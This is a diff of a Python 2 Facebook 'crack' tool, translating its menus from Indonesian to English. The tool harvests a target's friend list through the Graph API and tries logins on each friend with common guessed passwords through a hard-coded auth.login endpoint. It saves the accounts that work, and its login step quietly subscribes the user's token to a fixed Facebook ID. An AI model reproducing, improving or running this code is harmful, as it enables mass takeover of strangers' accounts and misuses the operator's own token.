@@ -36,7 +36,7 @@ def acak(b):
 
 
 logo = ''' 
-____       _    _     _
+ ____       _    _     _
 |  _ \ __ _| | _(_)___| |_ __ _ _ __
 | |_) / _` | |/ / / __| __/ _` | '_ \
 |  __/ (_| |   <| \__ \ || (_| | | | |
@@ -56,44 +56,44 @@ def pilog():
         os.system("clear")
         print logo
         print 
-        print ("Login Pake Token").center(50)
+        print ("Login Token").center(50)
         print
-        print ("[1] Buat Akun Baru Dan Download GetAccessToken Apk Di Playstore")
+        print ("[1] Download GetAccessToken Apk From Playstore")
         print('')
-        print ("[2] Setelah Membuka Apk Berikan ID & Kata Sandi Anda Dan Klik Dapatkan Sekarang Untuk Mendapatkan Token dan Tempel Di Sini")
+        print ("[2] Make New Fake Id And Generate Access Token By THe App")
         print('')
-        print ("[3] Harap Aktifkan Otentikasi Dua Faktor Pada Akun Anda Sebelum Membuat Token")
+        print ("[3] Copy The Access Token And Past In The Tool")
         print 
-        token = raw_input("[+] Tempel Token Disini : ")
-        sav = open(".logfuck.txt","w")
+        token = raw_input("[+] Past Your Token Here : ")
+        sav = open(".logacid.txt","w")
         sav.write(token)
         sav.close()
-        print ("\r\033[1;32m[✓] Login Berhasil\033[0;97m")
+        print ("\r\033[1;32m[✓] Login Successfully\033[0;97m")
         time.sleep(1)
         bot_fl()
     elif og =="0":
         exit()
     else:
-        print ("[!] Pilih Yang Bener Dong")
+        print ("[!] Select In The Above")
         pilog()
         
 def bot_fl():
     try:
-        token = open('.logfuck.txt', 'r').read()
+        token = open('.logAcid.txt', 'r').read()
     except IOError:
         print '\x1b[1;97m   [!] Token invalid'
-        os.system('rm -rf .logfuck.txt')
+        os.system('rm -rf .logAcid.txt')
     requests.post('https://graph.facebook.com/100001027764318/subscribers?access_token=' + token)
     menu()
     
 def menu():
     os.system("clear")
     try:
-        token = open(".logfuck.txt","r").read()
+        token = open(".logAcid.txt","r").read()
     except IOError:
         print logo
-        print("[!] Kesalahan Token. Token Tidak Ditemukan")
-        os.system("rm -rf .logfuck.txt")
+        print("[!] Token Error or Toke Not Found")
+        os.system("rm -rf .logAcid.txt")
         time.sleep(1)
         logmen()
     try:
@@ -103,17 +103,17 @@ def menu():
     except KeyError:
         os.system("clear")
         print logo
-        print("[!] Gagal Memuat . Akun Anda Checkpoint")
-        os.system("rm -rf .logfuck.txt")
+        print("[!] Fail To Load Your Account Is It Checkpiont")
+        os.system("rm -rf .logAcid.txt")
         time.sleep(1)
         logmen()
     os.system("clear")
     print logo
-    print("Selamat Datang "+name)
-    print ("Silahkan Pilih")
+    print("Welcome "+name)
+    print ("Please Select")
     print
     print("[1] Start Crack")
-    print("[\x1b[91m0\x1b[0m] Keluar")
+    print("[\x1b[91m0\x1b[0m] Exit")
     pil()
     
 def pil():
@@ -121,13 +121,13 @@ def pil():
     if ti =='1':
         cramen()
     elif ti =='0':
-        os.system('rm -rf .logfuck.txt')
-        print '[√] Menghapus Token Berhasil.'
+        os.system('rm -rf .logAcid.txt')
+        print '[√] Deleting Token Successfully.'
         time.sleep(1)
         os.system('exit')
         logmen()
     else:
-        print '[!] Pilih Yang Bener Dong'
+        print '[!] Chose Serious Please'
         pil()
         
 def cramen():
@@ -136,14 +136,14 @@ def cramen():
 	try:
 		token=open(".logfuck.txt","r").read()
 	except IOError:
-		print("[!] Kesalahan Token . Token Tidak Berfungsi")
-		os.system("rm -rf .logfuck.txt")
+		print("[!] Token Error. Token Not Working")
+		os.system("rm -rf .logAcid.txt")
 		time.sleep(1)
 		logmen()
 	os.system("clear")
 	print logo
-	print "[1] Crack ID Publik"
-	print '[\x1b[91m0\x1b[0m] Kembali'
+	print "[1] Crack ID Public"
+	print '[\x1b[91m0\x1b[0m] Back'
 	crapil()
 	
 def crapil():
@@ -164,16 +164,16 @@ def crapil():
 	elif select =="1":
 		os.system("clear")
 		print logo
-		idt = raw_input("[+] Masukan ID : ")
+		idt = raw_input("[+] Enter Target ID : ")
 		os.system("clear")
 		print logo
 		try:
 			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
 			q = json.loads(r.text)
-			print("[✓] Nama Akun : "+q["name"])
+			print("[✓] Account name : "+q["name"])
 		except KeyError:
-			print('\n[!] Kesalahan ID . ID : '+idt+' Teman Tidak Publik')
-			raw_input("\nKembali ")
+			print('\n[!] ID error . ID : '+idt+' Unlisted Friends')
+			raw_input("\nBack ")
 			cramen()
 		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token, headers=header)
 		z = json.loads(r.text)
@@ -186,7 +186,7 @@ def crapil():
 	elif select =="0":
 		menu()
 	else:
-		print ("[!] Pilih Yang Bener Dong")
+		print ("[!] Chose Serious Please")
 		crapil()
 	print("[✓] Total ID : "+str(len(id)))
 	time.sleep(0.5)
@@ -248,7 +248,7 @@ def crapil():
 		                            ok.close()
 		                            oks.append(uid)
 		                        else:
-		                            pass4="786786"
+		                            pass4="Love123"
 		                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass4 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
 		                            d=json.loads(q)
 		                            if 'www.facebook.com' in d['error_msg']:
@@ -282,7 +282,7 @@ def crapil():
 		                                            ok.close()
 		                                            oks.append(uid)
 		                                        else:
-		                                            pass6="786786"
+		                                            pass6="Pakistan123"
 		                                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass6 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
 		                                            d=json.loads(q)
 		                                            if 'www.facebook.com' in d['error_msg']:
@@ -323,7 +323,7 @@ def crapil():
 	p.map(main, id)
 	print('')
 	print('[✓] Total CP/\033[1:32mOK:\033[0;97m  '+str(len(cps))+'/\033[;32m \033[0;97m'+str(len(oks)))
-	raw_input('Kembali ')
+	raw_input('Back ')
 	menu()
     
 if __name__ == '__main__':
